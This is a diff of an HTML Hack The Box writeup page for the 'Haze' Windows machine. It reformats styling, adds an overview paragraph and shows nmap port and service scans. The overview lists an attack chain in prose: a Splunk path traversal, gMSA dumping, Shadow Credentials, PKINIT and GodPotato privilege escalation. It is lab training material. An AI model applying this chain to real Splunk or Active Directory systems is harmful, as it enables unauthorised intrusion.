@@ -3,353 +3,72 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Haze Writeup — Hackthekat</title>
   <meta name="description" content="HTB Haze machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      haze
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>haze</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -361,58 +80,48 @@
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Haze</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-hard">Hard</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Haze is a Hard difficulty Windows AD machine running <strong>Splunk Enterprise 9.2.1</strong>. The attack begins by exploiting <strong>CVE-2024-36991</strong> (Splunk path traversal) to read sensitive files, extracting a password from the <code>authentication.conf</code> via LFI. After gaining AD access and collecting BloodHound data, the attack chains through <strong>gMSA password dumping</strong>, <strong>AD group ownership manipulation</strong>, <strong>Shadow Credentials</strong> via pyWhisker, and <strong>PKINIT</strong> hash extraction. A Splunk backup is decrypted to find credentials for a user with <strong>SeImpersonatePrivilege</strong>, and <strong>GodPotato</strong> is used to achieve SYSTEM access.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
-      <div class="code-block"><pre><code>nmap -p- 10.129.97.167 
+      <p>I start with a full port scan revealing standard AD ports plus Splunk services on ports 8000, 8088, and 8089.</p>
+      <div class="code-block"><pre><code>nmap -p- 10.129.97.167           
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-08 00:35 CEST
 Nmap scan report for 10.129.97.167
 Host is up (0.026s latency).
 Not shown: 65505 closed tcp ports (reset)
-PORT STATE SERVICE
-53/tcp open domain
-88/tcp open kerberos-sec
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-5985/tcp open wsman
-8000/tcp open http-alt
-8088/tcp open radan-http
-8089/tcp open unknown
-9389/tcp open adws
-47001/tcp open winrm</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services that are open on the ip address.</p>
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+8000/tcp  open  http-alt
+8088/tcp  open  radan-http
+8089/tcp  open  unknown
+9389/tcp  open  adws
+47001/tcp open  winrm</code></pre></div>
+      <p>A detailed service-version scan (<code>-sCV</code>) fingerprints the exact software versions running on each open port, helping identify potential vulnerabilities.</p>
       <div class="code-block"><pre><code>nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49668,49674,49683,49684,54425,54430,54432,54445,54494 -sCV 10.129.97.167 -vvvv
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-08 00:38 CEST
 Scanned at 2025-04-08 00:38:24 CEST for 73s
 
-PORT STATE SERVICE REASON VERSION
-53/tcp open domain syn-ack ttl 127 Simple DNS Plus
-88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-08 01:40:39Z)
-135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-08 01:40:39Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
 |_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: commonName=dc01.haze.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb
@@ -421,13 +130,13 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-03-05T07:12:20
-| Not valid after: 2026-03-05T07:12:20
-| MD5: db18:a1f5:986c:1470:b848:35ec:d437:1ca0
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
 | SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
-445/tcp open microsoft-ds? syn-ack ttl 127
-464/tcp open kpasswd5? syn-ack ttl 127
-593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=dc01.haze.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb
 | Issuer: commonName=haze-DC01-CA/domainComponent=haze
@@ -435,11 +144,11 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-03-05T07:12:20
-| Not valid after: 2026-03-05T07:12:20
-| MD5: db18:a1f5:986c:1470:b848:35ec:d437:1ca0
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
 | SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
 |_ssl-date: TLS randomness does not represent time
-3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=dc01.haze.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb
 | Issuer: commonName=haze-DC01-CA/domainComponent=haze
@@ -447,11 +156,11 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-03-05T07:12:20
-| Not valid after: 2026-03-05T07:12:20
-| MD5: db18:a1f5:986c:1470:b848:35ec:d437:1ca0
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
 | SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
 |_ssl-date: TLS randomness does not represent time
-3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=dc01.haze.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb
 | Issuer: commonName=haze-DC01-CA/domainComponent=haze
@@ -459,39 +168,39 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-03-05T07:12:20
-| Not valid after: 2026-03-05T07:12:20
-| MD5: db18:a1f5:986c:1470:b848:35ec:d437:1ca0
+| Not valid after:  2026-03-05T07:12:20
+| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
 | SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
 |_ssl-date: TLS randomness does not represent time
-5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
-8000/tcp open http syn-ack ttl 127 Splunkd httpd
+8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd
 |_http-server-header: Splunkd
 | http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).
 |_Requested resource was http://10.129.97.167:8000/en-US/account/login?return_to=%2Fen-US%2F
 | http-robots.txt: 1 disallowed entry 
 |_/
 | http-methods: 
-|_ Supported Methods: GET HEAD POST OPTIONS
+|_  Supported Methods: GET HEAD POST OPTIONS
 |_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
-8088/tcp open ssl/http syn-ack ttl 127 Splunkd httpd
+8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
 |_http-title: 404 Not Found
 | http-methods: 
-|_ Supported Methods: GET POST HEAD OPTIONS
+|_  Supported Methods: GET POST HEAD OPTIONS
 | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
 | Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-03-05T07:29:08
-| Not valid after: 2028-03-04T07:29:08
-| MD5: 82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
+| Not valid after:  2028-03-04T07:29:08
+| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
 | SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
 |_http-server-header: Splunkd
 | http-robots.txt: 1 disallowed entry 
 |_/
-8089/tcp open ssl/http syn-ack ttl 127 Splunkd httpd
+8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
 |_http-title: splunkd
 | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
 | Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
@@ -499,69 +208,69 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-03-05T07:29:08
-| Not valid after: 2028-03-04T07:29:08
-| MD5: 82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
+| Not valid after:  2028-03-04T07:29:08
+| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
 | SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
 | http-methods: 
-|_ Supported Methods: GET HEAD OPTIONS
+|_  Supported Methods: GET HEAD OPTIONS
 |_http-server-header: Splunkd
 | http-robots.txt: 1 disallowed entry 
 |_/
-9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing
-47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
-49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49674/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49683/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-49684/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-54425/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-54430/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-54432/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-54445/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-54494/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
